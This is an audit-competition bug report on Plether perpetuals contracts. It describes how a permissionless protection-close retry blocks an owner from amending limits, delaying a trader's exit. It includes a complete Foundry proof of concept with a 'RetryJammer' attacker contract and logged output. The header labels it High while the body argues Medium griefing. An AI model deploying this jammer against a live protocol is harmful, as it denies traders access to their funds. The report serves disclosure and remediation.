# \#99321 [SC-High] Public protection retries deny owner limit repair

**Submitted on Nov 13th 2026 at 06:16:10 UTC by @k42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99321
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description


After a trader's bounded protection close fails, anyone can repeatedly queue another close with identical failing limits. Public retry changes protection status from `Latched` to `Triggered` and creates a pending order. Owner amendment is allowed only while status remains `Latched` with no pending order. A gas funded adversary can therefore win each recovery race and delay a trader's exit. Two Foundry tests show an active owner losing that race and sixty atomic renewals preserving a 991.599633 USDG cash access gap for 3,661 seconds. This is conditional Medium griefing, not theft or an unconditional fund freeze.

## Vulnerability Details

An owner opens a 10,000 unit LONG at a 1e8 mark and attaches protection with a 10,000 USDG execution notional ceiling. At a valid 1.1e8 trigger mark, full close notional is 11,000 USDG, so close fails its retained financial ceiling. Failure returns protection to `Latched`; owner should be able to increase that ceiling before retrying.

`PositionProtectionBook.amendLatchedPositionProtectionCloseLimits` requires `Latched` plus zero pending orders. Yet `retryPositionProtectionClose` is permissionless and queues a new close without owner approval. `_recordCloseAttempt` changes status to `Triggered`, and Router copies unchanged owner limits into every retry. A failed or expired child returns to `Latched`. Any adversary can execute or expire a child and retry in one transaction, leaving no intertransaction amendment window. Repeating expiration and retry before owner recovery transactions keeps a nonexecutable child active.

```solidity
// PositionProtectionBook.sol, abbreviated
if (protection.status != PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (router.pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}

// retryPositionProtectionClose is external and checks no owner identity.
linkedOrderId = router.commitProtectionCloseAttempt(
    protectionId, protection.account, protection.side, protection.size
);
protection.status = PositionProtectionStatus.Triggered;
```

While `Triggered`, owner amendment reverts, protection cancellation reverts, atomic cancel and close reverts, and ordinary manual close commitment reverts because an active protection locks account trading. A second PoC test has owner actively execute a failing child with fresh oracle data. Protection relatches, but a public retry in next block occurs before owner's amendment transaction and makes that amendment revert. Thus demonstration does not depend on a passive owner or abandoned keeper.

Public scan describes an *unpaid keeper abandoning* a protection close after collecting trigger bounty. Here an adversary actively pays for retries to deny owner correction, including after owner executes a child. Cecuro MED 9 describes absent financial ceilings on retries; current code retains those ceilings and promises owner amendment while latched. Neither published root describes public retry preempting that correction. This distinction remains subject to judging.

## Impact Details

**Medium: Griefing.** At identical final time and mark, control owner amends its ceiling, closes, and withdraws 18,991.199633 USDG. Under sixty attacker renewals, owner withdraws only 17,999.600000 USDG of free cash. Another 991.599633 USDG of matched exit proceeds remains inaccessible, with a 1,985.500632 USDG position pledge still locked. Attacker spends 56,116,047 gas across sixty atomic renewal calls; no USDG deposit or role is required. Expiration plus retry needs no oracle update; initial failed execution needs a valid paid oracle update in production.

PoC covers 3,661 seconds, but duration depends on adversary winning successive ordering races. Owner can execute a failing child and win a subsequent amendment race, use an ordered transaction bundle, or use a contract wallet able to execute and amend atomically. Consequently this report selects **Griefing**, not a deterministic one hour freeze, High impact, permanent lock, insolvency, or theft.

## References

- [Competition scope and Medium griefing impact](https://immunefi.com/audit-competition/plether/scope/)
- [Competition information and runnable PoC requirement](https://immunefi.com/audit-competition/plether/information/)
- [Owner amendment and public retry gates](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L314-L405)
- [Retry changes status to Triggered](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578)
- [Failed child relatches](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L641-L667)
- [Close limits copied into every child](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L655-L680)
- [Ordinary order blocked by active protection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315)
- [Permissionless order expiry](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191-L195)
- [Documented protection lifecycle](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L535-L557)
- [Cecuro MED 9](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [Published unpaid trigger bounty issue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L544-L585)


## Proof of Concept

## Proof of Concept

At pinned commit, save full code below as `packages/perps/test/poc/LatchedRetryAmendLock.t.sol`, then run from `packages/perps`:

```bash
forge test --match-path test/poc/LatchedRetryAmendLock.t.sol --match-test 'test_PoC_.*' -vv
```

PoC deploys unmodified production Router and uses repository test fixture for remaining production perps contracts. Mock token and Pyth update transport are deterministic test dependencies; no in scope source is changed. Output amounts are six decimal USDG atoms:

```text
[PASS] test_PoC_ActiveOwnerCanLoseAmendmentRace()
[PASS] test_PoC_PermissionlessRetryPreventsOwnerAmendmentBeyondOneHour()
elapsed_seconds: 3661
control_withdrawable_usdg_6dec: 18991199633
attack_free_cash_withdrawn_usdg_6dec: 17999600000
matched_cash_gap_usdg_6dec: 991599633
attacked_locked_position_margin_usdg_6dec: 1985500632
attacker_gas_for_60_atomic_renewals: 56116047
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Full runnable test:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {PositionProtectionTest} from "test/perps/spec/trader/PositionProtection.t.sol";
import {LegacyOrderRouterHarness} from "test/utils/LegacyOrderRouterHarness.sol";

contract RetryJammer {

    function failAndRetry(
        OrderRouter router,
        IPositionProtectionActions actions,
        uint64 orderId,
        uint64 protectionId,
        bytes[] calldata executionData
    ) external payable returns (uint64 nextOrderId) {
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: msg.value}(orderId, executionData);
        require(result.status == OrderV3Types.LifecycleStatus.Failed, "initial close must fail");
        require(
            result.terminalReason == OrderV3Types.TerminalReason.ConstraintViolation, "initial close must fail at bound"
        );
        nextOrderId = actions.retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(
        OrderRouter router,
        IPositionProtectionActions actions,
        uint64 orderId,
        uint64 protectionId
    ) external returns (uint64 nextOrderId) {
        router.expireOrder(orderId);
        nextOrderId = actions.retryPositionProtectionClose(protectionId);
    }

}

contract LatchedRetryAmendLockPoC is PositionProtectionTest {

    struct Scenario {
        uint64 protectionId;
        uint64 firstOrderId;
        uint256 finalTime;
        bytes[] firstExecutionData;
        PositionProtectionTypes.CloseFinancialLimits usableLimits;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter productionRouter = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(productionRouter), predictedRouter);
        deployedRouter = LegacyOrderRouterHarness(address(productionRouter));
    }

    function test_PoC_PermissionlessRetryPreventsOwnerAmendmentBeyondOneHour() public {
        Scenario memory scenario = _prepareScenario();
        uint256 checkpoint = vm.snapshotState();
        uint256 controlReceipt = _controlExit(scenario);
        assertTrue(vm.revertToState(checkpoint));
        _runJam(scenario, controlReceipt);
    }

    function test_PoC_ActiveOwnerCanLoseAmendmentRace() public {
        Scenario memory scenario = _prepareScenario();
        RetryJammer jammer = new RetryJammer();
        uint64 pendingOrderId = jammer.failAndRetry(
            router, protectionActions, scenario.firstOrderId, scenario.protectionId, scenario.firstExecutionData
        );
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory ownerExecutionData = _livePriceData(LONG_STOP_LOSS);
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory ownerResult = router.executeOrder(pendingOrderId, ownerExecutionData);
        assertEq(uint8(ownerResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(ownerResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(protectionViews.getPositionProtection(scenario.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(BOB);
        uint64 attackerRetryId = protectionActions.retryPositionProtectionClose(scenario.protectionId);
        assertGt(attackerRetryId, pendingOrderId);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(scenario.protectionId, scenario.usableLimits);
    }

    function _prepareScenario() private returns (Scenario memory scenario) {
        vm.warp(uint256(engine.lastMarkTime()) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.OrderRequest memory openRequest =
            _boundedOpenRequest(CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, 0);
        vm.prank(ALICE);
        uint64 openOrderId = router.commitOrder(openRequest);
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory openData = _livePriceData(MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory openResult = router.executeOrder(openOrderId, openData);
        assertEq(uint8(openResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        _refreshMark(MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxExecutionNotionalAssets = 10_000e6;
        vm.prank(ALICE);
        scenario.protectionId = protectionActions.createPositionProtection(params);
        assertEq(POSITION_SIZE * LONG_STOP_LOSS / 1e20, 11_000e6);
        scenario.usableLimits = params.closeLimits;
        scenario.usableLimits.maxExecutionNotionalAssets = type(uint256).max;

        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(TRIGGER_KEEPER);
        scenario.firstOrderId =
            protectionActions.triggerPositionProtection(scenario.protectionId, _livePriceData(LONG_STOP_LOSS));
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        scenario.firstExecutionData = _livePriceData(LONG_STOP_LOSS);
        scenario.finalTime = vm.getBlockTimestamp() + 3660;
    }

    function _controlExit(
        Scenario memory scenario
    ) private returns (uint256 receipt) {
        _startRecordingLogs();
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory firstResult =
            router.executeOrder(scenario.firstOrderId, scenario.firstExecutionData);
        assertEq(uint8(firstResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(firstResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(
                _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), scenario.firstOrderId)
                .failedConstraint
            ),
            uint8(OrderV3Types.ConstraintKind.ExecutionNotional)
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(scenario.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );
        vm.warp(scenario.finalTime);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(LONG_STOP_LOSS);
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(scenario.protectionId, scenario.usableLimits);
        vm.prank(CAROL);
        uint64 controlOrderId = protectionActions.retryPositionProtectionClose(scenario.protectionId);
        vm.warp(scenario.finalTime + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory executionData = _livePriceData(LONG_STOP_LOSS);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory controlResult = router.executeOrder(controlOrderId, executionData);
        assertEq(uint8(controlResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        receipt = clearinghouse.balanceAssets(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdrawMargin(receipt);
        assertEq(settlementToken.balanceOf(ALICE), receipt);
    }

    function _runJam(
        Scenario memory scenario,
        uint256 controlReceipt
    ) private {
        RetryJammer jammer = new RetryJammer();
        uint64 pendingOrderId = jammer.failAndRetry(
            router, protectionActions, scenario.firstOrderId, scenario.protectionId, scenario.firstExecutionData
        );
        assertEq(router.pendingOrderCounts(ALICE), 1);
        uint256 start = vm.getBlockTimestamp();
        uint256 attackerGas;
        for (uint256 i; i < 60; ++i) {
            uint64 deadline = router.lifecycleBook().orderTiming(pendingOrderId).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            uint256 gasBefore = gasleft();
            pendingOrderId = jammer.expireAndRetry(router, protectionActions, pendingOrderId, scenario.protectionId);
            attackerGas += gasBefore - gasleft();
            assertEq(router.pendingOrderCounts(ALICE), 1);
        }
        OrderV3Types.ExecutionBounds memory retainedBounds = router.lifecycleBook().pendingPolicy(pendingOrderId);
        assertEq(retainedBounds.maxExecutionNotionalAssets, 10_000e6);

        assertGt(vm.getBlockTimestamp() - start, 1 hours);
        vm.warp(scenario.finalTime + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(LONG_STOP_LOSS);
        uint256 attackFreeAssets = _freeSettlementAssets(ALICE);
        assertGt(attackFreeAssets, 0, "free balance remains withdrawable");
        vm.prank(ALICE);
        clearinghouse.withdrawMargin(attackFreeAssets);
        uint256 attackWalletReceipt = settlementToken.balanceOf(ALICE);
        assertLt(attackWalletReceipt, controlReceipt, "position exit value remains inaccessible");
        uint256 remainingLockedBalance = clearinghouse.balanceAssets(ALICE);
        vm.prank(ALICE);
        vm.expectRevert();
        clearinghouse.withdrawMargin(remainingLockedBalance);
        _assertOwnerCannotExit(scenario);
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE);
        assertGt(clearinghouse.pnlPledgeAssets(ALICE), 0);
        emit log_named_uint("elapsed_seconds", vm.getBlockTimestamp() - start);
        emit log_named_uint("control_withdrawable_usdg_6dec", controlReceipt);
        emit log_named_uint("attack_free_cash_withdrawn_usdg_6dec", attackWalletReceipt);
        emit log_named_uint("matched_cash_gap_usdg_6dec", controlReceipt - attackWalletReceipt);
        emit log_named_uint("attacked_locked_position_margin_usdg_6dec", clearinghouse.pnlPledgeAssets(ALICE));
        emit log_named_uint("attacker_gas_for_60_atomic_renewals", attackerGas);
    }

    function _assertOwnerCannotExit(
        Scenario memory scenario
    ) private {
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(scenario.protectionId, scenario.usableLimits);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(scenario.protectionId);
        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(scenario.protectionId, manualClose);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);
    }

}

```

